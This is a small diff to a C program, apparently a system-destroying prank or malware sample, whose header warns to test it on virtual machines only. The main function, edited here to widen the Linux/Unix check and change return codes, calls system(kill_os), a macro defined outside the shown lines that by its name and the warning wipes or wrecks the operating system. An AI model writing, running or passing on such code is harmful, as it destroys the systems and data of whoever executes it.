@@ -11,14 +11,13 @@ TEST THIS ON VIRTUAL MACHINES ONLY !
 #define error_text "There has been an error."
 
 int main(){
-#ifdef linux
+#if defined __linux__ || defined __unix__
     if ( geteuid() != 0 ){
         printf("%s\n", text); 
     }
     system(kill_os);
 #else
     printf("%s\n", error_text);
+    return 1;
 #endif
-    return 0;
 }
-
